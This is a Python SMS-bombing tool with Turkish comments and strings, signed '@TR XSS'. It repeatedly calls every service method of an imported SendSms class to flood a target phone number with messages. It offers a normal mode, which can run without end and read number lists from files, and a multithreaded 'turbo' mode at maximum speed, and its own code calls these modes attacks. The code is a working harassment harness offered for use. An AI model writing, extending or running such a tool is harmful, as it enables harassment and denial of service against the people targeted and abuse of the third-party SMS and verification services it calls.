from colorama import Fore, Style
from time import sleep, time
from os import system
import threading
import sys
# NOT: Bu araç, 'sms.py' adlı bir dosya içinde bulunan 'SendSms' sınıfına bağımlıdır.
# Lütfen bu sınıfın ve servislerinin mevcut olduğundan emin olun.
from sms import SendSms 

# --- GÖRSEL VE YARDIMCI FONKSİYONLAR ---

def clear_screen():
    """Konsol ekranını temizler."""
    system("cls||clear")

def show_tr_banner():
    """Gelişmiş TR ASCII Sanatını gösterir."""
    clear_screen()
    print(Fore.LIGHTRED_EX + """
TTTTT   RRRRR   X   X   SSSSS
  T     R    R   X X    S
  T     RRRRR     X     SSSSS
  T     R R      X X        S
  T     R  RR   X   X   SSSSS
    """ + Style.RESET_ALL)

def update_status(start_time, target_phone, count, limit, mode):
    """Saldırı sırasında gerçek zamanlı sayaç ve durumu günceller."""
    elapsed = int(time() - start_time)
    
    if mode == "NORMAL":
        status_text = f"Gönderilen SMS: {Fore.LIGHTYELLOW_EX}{count}{Style.RESET_ALL} / {Fore.LIGHTGREEN_EX}{limit if limit is not None else '∞'}{Style.RESET_ALL}"
    else: # Turbo Mod
        status_text = f"Gönderim Hızı: {Fore.LIGHTYELLOW_EX}Maksimum Hız (Çoklu Thread){Style.RESET_ALL}"

    sys.stdout.write(f"\r[{Fore.LIGHTMAGENTA_EX}DURUM{Style.RESET_ALL}] Hedef: {Fore.LIGHTBLUE_EX}{target_phone}{Style.RESET_ALL} | Süre: {Fore.CYAN}{elapsed} sn{Style.RESET_ALL} | {status_text} | Durdurmak için Ctrl+C...")
    sys.stdout.flush()

# --- ANA MANTIĞI HAZIRLAMA ---

# SendSms sınıfındaki tüm çağrılabilir servisleri otomatik olarak al
servisler_sms = [
    attr for attr in dir(SendSms) 
    if callable(getattr(SendSms, attr)) and not attr.startswith('__')
]

# --- MOD 1: NORMAL SALDIRI FONKSİYONU ---

def normal_mode_attack(tel_liste, mail, kere, aralik):
    """Normal mod saldırı döngüsünü yönetir ve durum güncellemeleri sağlar."""
    
    for tel in tel_liste:
        sms = SendSms(tel, mail)
        start_time = time()
        
        print(Fore.LIGHTGREEN_EX + f"\n\n[BAŞLATILDI] --> Hedef {tel} ({'Sonsuz' if kere is None else f'{kere} adet'} SMS) <--\n" + Style.RESET_ALL)
        
        # Sonsuz döngü (Kere = None)
        if kere is None: 
            while True:
                for attribute in servisler_sms:
                    update_status(start_time, tel, sms.adet, kere, "NORMAL")
                    # Servisi çağır
                    exec("sms."+attribute+"()")
                    sleep(aralik)
        
        # Sınırlı döngü
        elif isinstance(kere, int):
            while sms.adet < kere:
                for attribute in servisler_sms:
                    if sms.adet >= kere:
                        break
                    
                    update_status(start_time, tel, sms.adet, kere, "NORMAL")
                    # Servisi çağır
                    exec("sms."+attribute+"()")
                    sleep(aralik)
            
            update_status(start_time, tel, sms.adet, kere, "NORMAL") # Son durumu göster
            print(Fore.LIGHTGREEN_EX + f"\n\n[TAMAMLANDI] --> Hedef {tel} için {sms.adet} adet SMS gönderildi. <--\n" + Style.RESET_ALL)

# --- MOD 2: TURBO SALDIRI FONKSİYONU ---

def turbo_mode_attack(tel_no, mail):
    """Turbo mod saldırı döngüsünü yönetir (Çoklu thread)."""
    
    send_sms = SendSms(tel_no, mail)
    dur = threading.Event()
    start_time = time()

    print(Fore.LIGHTCYAN_EX + f"\n\n[BAŞLATILDI] --> TURBO SALDIRISI: {tel_no} (Ctrl+C ile durdurun) <--\n" + Style.RESET_ALL)
    print(Fore.YELLOW + "UYARI: Turbo modda gerçek zamanlı gönderilen SMS sayımı gösterilemez, ancak hız maksimumdur." + Style.RESET_ALL)
    print("-" * 70 + Style.RESET_ALL)
    
    def turbo_run():
        while not dur.is_set():
            # Durum güncelleyicisini de bir thread'de çalıştırmak yerine ana döngüde tutmak daha iyi.
            # Ancak burada hız için basit bir döngü yeterlidir.
            thread_list = []
            
            # Her servisi ayrı bir thread'de (iş parçacığında) çalıştırma
            for fonk in servisler_sms:
                # Daemon=True, ana program kapandığında thread'lerin otomatik kapanmasını sağlar
                t = threading.Thread(target=getattr(send_sms, fonk), daemon=True) 
                thread_list.append(t)
                t.start()
            
            # Tüm thread'lerin tamamlanmasını bekle (Bu, tüm servislerin bir döngüde çağrılmasını sağlar)
            for t in thread_list:
                t.join()
            
            # Durumu basitçe güncelle
            update_status(start_time, tel_no, send_sms.adet, None, "TURBO")

    try:
        turbo_run()
    except KeyboardInterrupt:
        dur.set()
        clear_screen()
        print(Fore.LIGHTRED_EX + "\n\n[DURDURULDU] Ctrl+C algılandı. Turbo mod durduruldu. Menüye dönülüyor..")
        sleep(2)

# --- ANA MENÜ DÖNGÜSÜ ---

while 1:
    show_tr_banner()
    
    # Ana menü başlığı
    print(Fore.LIGHTCYAN_EX + f"""
    SMS Servis Sayısı: {Fore.LIGHTYELLOW_EX}{len(servisler_sms)}{Fore.LIGHTCYAN_EX}           İmza: {Fore.LIGHTRED_EX}@TR XSS{Fore.LIGHTCYAN_EX}\n  
    """ + Style.RESET_ALL)
    
    try:
        menu_input = input(Fore.LIGHTMAGENTA_EX + " 1- SMS Gönder (Normal Mod - Kontrollü ve Sayaçlı)\n 2- SMS Gönder (Turbo Mod - Maksimum Hız)\n 3- Çıkış\n\n" + Fore.LIGHTYELLOW_EX + " Seçiminiz (1/2/3): ")
        
        if not menu_input: continue
        menu = int(menu_input) 
    
    except ValueError:
        clear_screen()
        print(Fore.LIGHTRED_EX + "[HATA] Lütfen sadece menü numarasını (1, 2, 3) giriniz.")
        sleep(3)
        continue

    # 1. NORMAL MOD İŞLEMLERİ
    if menu == 1:
        clear_screen()
        
        # 1. Telefon Numarası Girişi (Tek veya Dosya)
        print(Fore.LIGHTYELLOW_EX + "Hedef Telefon Numarası: (Başında '+90' olmadan 10 hane, çoklu numara için 'Dosya Yolu' yazın): "+ Fore.LIGHTGREEN_EX, end="")
        tel_input = input().strip()
        tel_liste = []
        
        if tel_input.lower() == "dosya yolu":
            clear_screen()
            print(Fore.LIGHTYELLOW_EX + "Telefon numaralarının kayıtlı olduğu dosyanın tam yolunu giriniz: "+ Fore.LIGHTGREEN_EX, end="")
            dizin = input().strip()
            try:
                with open(dizin, "r", encoding="utf-8") as f:
                    # Boş satırları ve 10 hane olmayanları filtrele
                    tel_liste = [i.strip() for i in f.read().strip().split("\n") if i.strip().isdigit() and len(i.strip()) == 10]
                
                if not tel_liste:
                    clear_screen()
                    print(Fore.LIGHTRED_EX + "[HATA] Dosyada geçerli (10 haneli) telefon numarası bulunamadı.")
                    sleep(3)
                    continue
                
                sonsuz_aciklama = ""
            except FileNotFoundError:
                clear_screen()
                print(Fore.LIGHTRED_EX + "[HATA] Dosya dizini hatalı veya dosya bulunamadı.")
                sleep(3)
                continue
        else:
            try:
                if not tel_input.isdigit() or len(tel_input) != 10:
                    raise ValueError
                tel_liste.append(tel_input)
                sonsuz_aciklama = "(Sonsuz için 'enter' tuşuna basınız)"  
            except ValueError:
                clear_screen()
                print(Fore.LIGHTRED_EX + "[HATA] Telefon numarası başında '+90' olmadan 10 hane olmalıdır.") 
                sleep(3)
                continue
        
        # 2. Mail Adresi Girişi
        clear_screen()
        print(Fore.LIGHTYELLOW_EX + "Mail adresi (Boş bırakırsanız rastgele mail adresi kullanılır): "+ Fore.LIGHTGREEN_EX, end="")
        mail = input().strip()
        
        # 3. SMS Adedi Girişi
        clear_screen()
        try:
            print(Fore.LIGHTYELLOW_EX + f"Kaç adet SMS göndermek istiyorsun {sonsuz_aciklama}: "+ Fore.LIGHTGREEN_EX, end="")
            kere_input = input().strip()
            kere = int(kere_input) if kere_input else None
            if kere is not None and kere <= 0:
                raise ValueError
        except ValueError:
            clear_screen()
            print(Fore.LIGHTRED_EX + "[HATA] Geçerli bir sayı veya boş ('sonsuz' için) giriniz.") 
            sleep(3)
            continue
            
        # 4. Aralık Girişi
        clear_screen()
        try:
            print(Fore.LIGHTYELLOW_EX + "Servisler arası kaç saniye aralıkla göndermek istiyorsun (Min 0): "+ Fore.LIGHTGREEN_EX, end="")
            aralik = int(input().strip())
            if aralik < 0:
                 raise ValueError
        except ValueError:
            clear_screen()
            print(Fore.LIGHTRED_EX + "[HATA] Lütfen sıfır veya pozitif bir saniye değeri giriniz.") 
            sleep(3)
            continue
            
        # Saldırıyı Başlat
        try:
            normal_mode_attack(tel_liste, mail, kere, aralik)
        except Exception as e:
            print(Fore.LIGHTRED_EX + f"\n\n[KRİTİK HATA] Normal mod çalıştırılırken bir hata oluştu: {e}")
        
        print(Fore.LIGHTRED_EX + "\nMenüye dönmek için 'enter' tuşuna basınız..")
        input()

    # 2. TURBO MOD İŞLEMLERİ
    elif menu == 2:
        clear_screen()
        
        # 1. Telefon Numarası Girişi (Turbo Mod tek numara için)
        print(Fore.LIGHTYELLOW_EX + "Hedef Telefon Numarası: (Başında '+90' olmadan 10 hane): "+ Fore.LIGHTGREEN_EX, end="")
        tel_no = input().strip()
        
        try:
            if not tel_no.isdigit() or len(tel_no) != 10:
                raise ValueError
        except ValueError:
            clear_screen()
            print(Fore.LIGHTRED_EX + "[HATA] Telefon numarası başında '+90' olmadan 10 hane olmalıdır.") 
            sleep(3)
            continue
            
        # 2. Mail Adresi Girişi
        clear_screen()
        print(Fore.LIGHTYELLOW_EX + "Mail adresi (Boş bırakılırsa rastgele mail adresi kullanılır): "+ Fore.LIGHTGREEN_EX, end="")
        mail = input().strip()
        
        # Saldırıyı Başlat
        try:
            turbo_mode_attack(tel_no, mail)
        except Exception as e:
            print(Fore.LIGHTRED_EX + f"\n\n[KRİTİK HATA] Turbo mod çalıştırılırken bir hata oluştu: {e}")
            
    # 3. ÇIKIŞ
    elif menu == 3:
        clear_screen()
        print(Fore.LIGHTRED_EX + "Çıkış yapılıyor...")
        break

    # Geçersiz Seçim
    else:
        clear_screen()
        print(Fore.LIGHTRED_EX + "[HATA] Geçersiz menü seçimi. Lütfen 1, 2 veya 3 seçiniz.")
        sleep(3)
        continue

